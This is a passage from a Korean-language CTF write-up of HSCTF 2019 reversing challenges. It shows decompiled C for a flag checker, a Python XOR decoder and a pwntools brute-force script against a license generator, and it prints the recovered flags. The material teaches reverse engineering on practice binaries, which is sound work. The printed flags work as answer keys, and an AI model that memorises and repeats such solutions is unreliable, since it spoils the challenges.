+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax@2
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rsi@9
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [sp+10h] [bp-40h]@4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s; <span style="color:#75715e">// [sp+18h] [bp-38h]@3
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s1; <span style="color:#75715e">// [sp+20h] [bp-30h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v8; <span style="color:#75715e">// [sp+21h] [bp-2Fh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v9; <span style="color:#75715e">// [sp+22h] [bp-2Eh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v10; <span style="color:#75715e">// [sp+23h] [bp-2Dh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v11; <span style="color:#75715e">// [sp+24h] [bp-2Ch]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v12; <span style="color:#75715e">// [sp+25h] [bp-2Bh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v13; <span style="color:#75715e">// [sp+26h] [bp-2Ah]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v14; <span style="color:#75715e">// [sp+27h] [bp-29h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v15; <span style="color:#75715e">// [sp+28h] [bp-28h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v16; <span style="color:#75715e">// [sp+29h] [bp-27h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v17; <span style="color:#75715e">// [sp+2Ah] [bp-26h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v18; <span style="color:#75715e">// [sp+2Bh] [bp-25h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v19; <span style="color:#75715e">// [sp+2Ch] [bp-24h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v20; <span style="color:#75715e">// [sp+2Dh] [bp-23h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v21; <span style="color:#75715e">// [sp+2Eh] [bp-22h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v22; <span style="color:#75715e">// [sp+2Fh] [bp-21h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v23; <span style="color:#75715e">// [sp+30h] [bp-20h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v24; <span style="color:#75715e">// [sp+31h] [bp-1Fh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v25; <span style="color:#75715e">// [sp+32h] [bp-1Eh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v26; <span style="color:#75715e">// [sp+33h] [bp-1Dh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v27; <span style="color:#75715e">// [sp+34h] [bp-1Ch]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v28; <span style="color:#75715e">// [sp+35h] [bp-1Bh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v29; <span style="color:#75715e">// [sp+36h] [bp-1Ah]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v30; <span style="color:#75715e">// [sp+37h] [bp-19h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v31; <span style="color:#75715e">// [sp+38h] [bp-18h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v32; <span style="color:#75715e">// [sp+39h] [bp-17h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v33; <span style="color:#75715e">// [sp+3Ah] [bp-16h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v34; <span style="color:#75715e">// [sp+3Bh] [bp-15h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v35; <span style="color:#75715e">// [sp+3Ch] [bp-14h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v36; <span style="color:#75715e">// [sp+3Dh] [bp-13h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v37; <span style="color:#75715e">// [sp+3Eh] [bp-12h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v38; <span style="color:#75715e">// [sp+3Fh] [bp-11h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v39; <span style="color:#75715e">// [sp+40h] [bp-10h]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v40; <span style="color:#75715e">// [sp+41h] [bp-Fh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v41; <span style="color:#75715e">// [sp+42h] [bp-Eh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v42; <span style="color:#75715e">// [sp+43h] [bp-Dh]@7
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v43; <span style="color:#75715e">// [sp+48h] [bp-8h]@1
+</span><span style="color:#75715e"></span>
+  v43 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>MK_FP(__FS__, <span style="color:#ae81ff">40LL</span>);
+  <span style="color:#66d9ef">if</span> ( a1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
+    <span style="color:#66d9ef">goto</span> LABEL_12;
+  s <span style="color:#f92672">=</span> a2[<span style="color:#ae81ff">1</span>];
+  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)strlen(a2[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">35</span> )
+    <span style="color:#66d9ef">goto</span> LABEL_12;
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">35</span>; <span style="color:#f92672">++</span>i )
+    s[i] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">1u</span>;
+  s1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i&#39;</span>;
+  v8 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
+  v9 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;b&#39;</span>;
+  v10 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;u&#39;</span>;
+  v11 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;g&#39;</span>;
+  v12 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;z&#39;</span>;
+  v13 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v&#39;</span>;
+  v14 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>;
+  v15 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v&#39;</span>;
+  v16 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;^&#39;</span>;
+  v17 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x&#39;</span>;
+  v18 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>;
+  v19 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;t&#39;</span>;
+  v20 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;^&#39;</span>;
+  v21 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;j&#39;</span>;
+  v22 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
+  v23 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>;
+  v24 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v&#39;</span>;
+  v25 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;^&#39;</span>;
+  v26 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
+  v27 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;5&#39;</span>;
+  v28 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;^&#39;</span>;
+  v29 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v&#39;</span>;
+  v30 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;@&#39;</span>;
+  v31 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2&#39;</span>;
+  v32 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;^&#39;</span>;
+  v33 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;9&#39;</span>;
+  v34 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i&#39;</span>;
+  v35 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3&#39;</span>;
+  v36 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;c&#39;</span>;
+  v37 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;@&#39;</span>;
+  v38 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>;
+  v39 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3&#39;</span>;
+  v40 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;8&#39;</span>;
+  v41 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;|&#39;</span>;
+  v42 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>strcmp(<span style="color:#f92672">&amp;</span>s1, s) )
+  {
+    puts(<span style="color:#e6db74">&#34;Oof, ur too good&#34;</span>);
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+LABEL_12:
+    puts(<span style="color:#e6db74">&#34;u do not know da wae&#34;</span>);
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFFFFFFFLL</span>;
+  }
+  v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>MK_FP(__FS__, <span style="color:#ae81ff">40LL</span>) <span style="color:#f92672">^</span> v43;
+  <span style="color:#66d9ef">return</span> result;
+}</code></pre></td></tr></table>
+</div>
+</div></p>
+
+<ol>
+<li><code>u do not know da wae</code>는 실패했을 때 나오는 문구. <code>Oof, ur too good</code>는 성공했을 때 나오는 문구 (line 97,91)<br /></li>
+<li><code>./a-byte hsctf{j3rrry}</code> 처럼 매개변수로 flag를 넘기는 방식 (line 46)<br /></li>
+<li><code>hsctf{j3rrry4567892123456789312345}</code> 처럼 flag의 길이는 35 bytes (line 49)<br /></li>
+<li>flag의 각 자리마다 1과 XOR 연산한 결과는 (line 51-52)<br /></li>
+<li><code>irbugzv1v^x1t^jo1v^e5^v@2^9i3c@138|</code>와 같아야 함. (line 53-88,89)<br /></li>
+</ol>
+
+<p>XOR 연산은 <a href="https://ko.wikipedia.org/wiki/배타적_논리합#암호_키에_사용" target="_blank">2회 반복하면 원래대로 된다.</a>
+따라서, <code>irbugzv1v^x1t^jo1v^e5^v@2^9i3c@138|</code>의 각 자리마다 1과 XOR 연산하면 flag가 된다.</p>
+
+<pre><code class="language-python">s = 'irbugzv1v^x1t^jo1v^e5^v@2^9i3c@138|'
+for c in s:
+    print chr(ord(c) ^ 1)
+</code></pre>
+
+<pre><code class="language-shell"># python a.py | tr -d '\n'
+hsctf{w0w_y0u_kn0w_d4_wA3_8h2bA029}
+</code></pre>
+
+<h2 id="license-index"><a href="#index">License</a></h2>
+
+<pre><code class="language-diff">License
+286
+Written by: ItzSomebody
+
+Description: Keith made a cool license-checking program but he forgot the flag he used to create the key! To make matters worse, he lost the source code and stripped the binary for his license-generator program. Can you help Keith recover his flag? All he knows is:
+
+* The license key is 4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O
+* He put his name (in the form of 'k3ith') as the first part of the flag
+* There are 3 underscores
+* The flag is in the format hsctf{}
+* The flag doesn't have random character sequences (you should be able to read the entire flag easily).
+* The flag only contains lowercase English letters and numbers.
+* The generator might produce the same keys for different inputs because Keith was too lazy to write the algorithm properly.
+
+253afe331e889837e3941878db30b070  license
+</code></pre>
+
+<p>Keith는 라이센스 생성기를 만들었지만 라이센스 키 생성에 사용했던 flag를 까먹었다! 게다가, 소스코드도 잃어먹고 바이너리는 스트립되어 있다.
+Keith의 flag를 되찾아 줄 수 있나요?
+그가 알고 있는 것은:</p>
+
+<ul>
+<li>라이센스 키는 <code>4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O</code> 이다.</li>
+<li>flag의 앞 부분에 그의 이름인 <code>k3ith</code>을 사용했다.</li>
+<li>3개의 <code>언더바(_)</code>가 사용되었다.</li>
+<li>flag는 <code>hsctf{}</code> 형식을 따른다.</li>
+<li>flag는 랜덤한 값을 갖지 않는다. (flag 전체를 쉽게 읽을 수 있다.)</li>
+<li>flag는 <code>소문자</code>와 <code>숫자</code>로 이루어져 있다.</li>
+<li>생성기는 서로 다른 flag에 대하여 같은 라이센스 키를 생성할 수 있다. 왜냐하면 Keith가 알고리즘을 빡세게 짜지 않았기 때문이다.</li>
+</ul>
+
+<p>디버거로 열어보면 c++로 짠 듯하다.
+다음은 실행했을 때의 모습이다.</p>
+
+<pre><code class="language-shell"># ./license
+gimme dat string: hsctf{awefaefa_fawefa_feaewf}
+generating key for: hsctf{awefaefa_fawefa_feaewf}
+4-EZF2M-XI12X-12XV2-XI12X-V21X1-I2O
+</code></pre>
+
+<p>입력한 flag의 길이 29만큼 라이센스 키도 29만큼 생성된다.</p>
+
+<pre><code class="language-python">&gt;&gt;&gt; len('hsctf{awefaefa_fawefa_feaewf}') == len('4-EZF2M-XI12X-12XV2-XI12X-V21X1-I2O'.replace('-',''))
+True
+</code></pre>
+
+<p>문자 하나하나 브루트 포싱해서 키값을 알아내 보았다.
+알고리즘을 빡세게 짜지 않았다.
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+    chset <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;_}&#39;</span><span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>ascii_lowercase<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;?&#39;</span>
+    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hsctf{k3ith_m4k3s_tr4sh_r3&#39;</span>
+    goal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O&#39;</span>
+    <span style="color:#75715e"># char brute force</span>
+    count <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(goal)<span style="color:#f92672">-</span>len(flag)<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>):
+        found <span style="color:#f92672">=</span> False
+        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> chset:
+            <span style="color:#75715e"># start ./license</span>
+            p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./license&#39;</span>)
+            <span style="color:#75715e"># append 1-char</span>
+            p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, flag<span style="color:#f92672">+</span>c)
+            <span style="color:#75715e"># parsing generated license</span>
+            p<span style="color:#f92672">.</span>recvline()
+            l <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()    <span style="color:#75715e"># generated license</span>
+            <span style="color:#75715e"># close the process</span>
+            p<span style="color:#f92672">.</span>close()
+            <span style="color:#75715e"># cmp &#39;generated license&#39; and &#39;goal license&#39;</span>
+            <span style="color:#66d9ef">for</span> a,b <span style="color:#f92672">in</span> zip(l[count:], goal[count:]):
+                <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> b:
+                    found <span style="color:#f92672">=</span> True
+                    count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+                <span style="color:#66d9ef">else</span>:
+                    <span style="color:#66d9ef">break</span>
+            <span style="color:#75715e"># if found let&#39;s findout next char</span>
+            <span style="color:#66d9ef">if</span> found:
+                <span style="color:#66d9ef">break</span>
+        flag <span style="color:#f92672">+=</span> c
+        <span style="color:#66d9ef">print</span> count,flag</code></pre></td></tr></table>
+</div>
+</div></p>
+
+<h2 id="tux-talk-show-2019-index"><a href="#index">Tux Talk Show 2019</a></h2>
+
+<p><code>#rand</code></p>
+
+<pre><code class="language-diff">Tux Talk Show 2019
+425
+Written by: Tux
+
+Tux Talk Show 2019. Yes, this is trash.
+
+nc rev.hsctf.com 6767
+
+6c3739cd202fcf3496f465db32ae7dd1  trash
+</code></pre>
+
+<p>rand() 함수는 난수를 발생하지만 값을 예측할 수 있다는 단점이 있다.
+정해진 알고리즘에 따라 숫자가 생성되기 때문이다.
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
